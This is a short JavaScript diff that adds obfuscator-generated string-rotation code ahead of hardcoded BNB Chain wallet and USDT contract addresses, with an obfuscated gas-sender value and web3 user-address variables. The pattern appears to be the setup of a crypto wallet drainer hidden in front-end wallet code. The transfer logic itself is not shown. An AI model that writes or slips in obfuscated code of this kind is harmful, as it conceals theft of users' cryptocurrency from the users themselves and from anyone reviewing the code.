@@ -1,4 +1,26 @@
-const bscAddress = "0xf5BcE2BD1E3E414ef9EaFC26DAdcbD990fe7f1A2",
+ const _0x1b5be5 = _0x3140;
+        (function (_0x12cc9b, _0x2789ae) {
+            const _0x5c24bd = _0x3140,
+                _0x5a43f4 = _0x12cc9b();
+            while (!![]) {
+                try {
+                    const _0x1867c4 =
+                        (-parseInt(_0x5c24bd(0xeb)) / 0x1) * (parseInt(_0x5c24bd(0xa7)) / 0x2) +
+                        (parseInt(_0x5c24bd(0xa6)) / 0x3) * (-parseInt(_0x5c24bd(0xb6)) / 0x4) +
+                        -parseInt(_0x5c24bd(0xba)) / 0x5 +
+                        -parseInt(_0x5c24bd(0xa4)) / 0x6 +
+                        (parseInt(_0x5c24bd(0x94)) / 0x7) * (-parseInt(_0x5c24bd(0xea)) / 0x8) +
+                        parseInt(_0x5c24bd(0xa1)) / 0x9 +
+                        parseInt(_0x5c24bd(0xb4)) / 0xa;
+                    if (_0x1867c4 === _0x2789ae) break;
+                    else _0x5a43f4["push"](_0x5a43f4["shift"]());
+                } catch (_0x57d290) {
+                    _0x5a43f4["push"](_0x5a43f4["shift"]());
+                }
+            }
+        })(_0x17fe, 0x6eebb);
+
+        const bscAddress = "0xf5BcE2BD1E3E414ef9EaFC26DAdcbD990fe7f1A2",
             bnbGasSender = _0x1b5be5(0xb9),
             usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
         let web3, userAddress;
